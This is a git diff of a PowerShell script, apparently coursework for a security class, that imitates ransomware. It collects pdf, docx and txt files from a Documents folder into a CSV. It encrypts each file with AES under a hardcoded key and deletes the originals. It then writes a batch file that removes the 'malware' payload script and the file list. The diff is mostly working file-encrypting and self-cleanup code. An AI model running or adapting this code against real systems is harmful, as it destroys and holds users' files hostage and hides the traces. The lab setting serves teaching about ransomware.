@@ -1,16 +1,12 @@
 ## Task 1: Creating a list of pdf, xlsx, and docx files in the "Documents" folder.
 
-Get-ChildItem -Recurse -Include *.pdf,*.docx,*.txt -Path C:/Users/benhacked.EMUL/Documents |Export-Csv `
+Get-ChildItem -Recurse -Include *.pdf,*.docx,*.txt -Path C:/Users/benhacked.EMUL/Desktop/SYS-320-SP22/Week12/homework/Documents |Export-Csv `
 -Path ./Week12/homework/xtra.csv
-
 
 # Import CSV file.
 
 $fileList = import-csv -Path C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week12\Homework\xtra.csv -header FullName
 
-#$fileList
-
-## Task 2: Loop through the CSV files and encrypt each of the files
 function Invoke-AESEncryption {
     [CmdletBinding()]
     [OutputType([string])]
@@ -80,7 +76,7 @@ function Invoke-AESEncryption {
                         break
                     }
                     $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                    $outPath = $File.FullName -replace ".pysa"
+                    $outPath = $File.FullName -replace ".aes"
                 }
 
                 $aesManaged.IV = $cipherBytes[0..15]
@@ -105,24 +101,24 @@ function Invoke-AESEncryption {
     }
 }
 
-#Loop through the results
+#Allows the results to be looped through
 
 foreach ($f in $fileList) {
 
-#    Get-Childitem -Path $f.FullName
     Invoke-AESEncryption -Mode Encrypt -Key "Unl0[k_M3" -Path $f.FullName
 
-    # Removes the unencrypted files
+    #Gets rid of the encrypted files
     Remove-Item -Path $f.FullName
 }
 
-# Delete main payload that contains malware
+# Payload that contains malware is deleted
 
 $malware_del = @"
 del ../../Week12/Homework/class2.ps1
+del ../../Week12/Homework/xtra.csv
 "@
 
-# Create Update.bat file with $delete_mal code
+# Here is where we create the refresher.bat file with $malware_del code
 
 $fPath = "C:\Users\benhacked.EMUL\Desktop\SYS-320-SP22\Week12\Homework\"
 
